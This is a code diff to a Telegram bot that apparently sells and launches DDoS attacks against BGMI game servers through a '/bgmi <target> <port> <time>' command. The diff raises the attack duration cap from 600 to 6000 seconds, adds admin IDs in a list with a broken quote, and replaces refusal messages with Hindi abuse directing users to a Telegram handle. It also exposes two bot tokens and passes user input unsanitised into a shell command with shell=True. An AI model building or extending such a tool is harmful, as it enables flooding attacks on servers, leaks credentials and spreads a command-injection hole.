@@ -7,10 +7,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('6358802070:AAHBDqHNPUSHJ6xgyyMKwM0bb4JXiUJZC3E')
+bot = telebot.TeleBot('7110052696:AAEeBalVYQk_o0XOfgyh7w4qWPDNTXYmBi4')
 
 # Admin user IDs
-admin_id = ["1045378059"]
+admin_id = ["1045378059","1635908789,"843532931"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -102,7 +102,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID to add 😒."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "LE BHOSDI KE PAHLE DM KAR @AnkitMor1.."
 
     bot.reply_to(message, response)
 
@@ -127,7 +127,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "LE BHOSDI KE PAHLE DM KAR @AnkitMor1."
 
     bot.reply_to(message, response)
 
@@ -147,7 +147,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "LE BHOSDI KE PAHLE DM KAR @AnkitMor1."
     bot.reply_to(message, response)
 
  
@@ -173,7 +173,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "LE BHOSDI KE PAHLE DM KAR @AnkitMor1."
     bot.reply_to(message, response)
 
 
@@ -192,7 +192,7 @@ def show_recent_logs(message):
             response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "LE BHOSDI KE PAHLE DM KAR @AnkitMor1."
         bot.reply_to(message, response)
 
 
@@ -207,7 +207,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+    response = f"{username}, GAME MA JA BOSDK😂.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -235,19 +235,19 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 600:
-                response = "Error: Time interval must be less than 80."
+            if time > 6000:
+                response = "Error: Time interval must be less than 6000."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 600"
+                full_command = f"./bgmi {target} {port} {time} 6000"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI @AnkitMor1. Finished. Target: {target} Port: {port} Port: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "❌ You Are Not Authorized To Use This Command ❌."
+        response = "LE BHOSDI KE PAHLE DM KAR @AnkitMor1."
 
     bot.reply_to(message, response)
 
@@ -269,7 +269,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "You Are Not Authorized To Use This Command 😡."
+        response = "CONTACT ADMIN FOR REGISTRATION @AnkitMor1.."
 
     bot.reply_to(message, response)
 
@@ -322,7 +322,7 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 600 (S)
+-> Attack Time : 6000 (S)
 > After Attack Limit : 0 seconds
 -> Concurrents Attack : 4000
 
@@ -366,7 +366,7 @@ def broadcast_message(message):
         else:
             response = "🤖 Please Provide A Message To Broadcast."
     else:
-        response = "Only Admin Can Run This Command 😡."
+        response = "LE BHOSDI KE PAHLE DM KAR @AnkitMor1.."
 
     bot.reply_to(message, response)
 
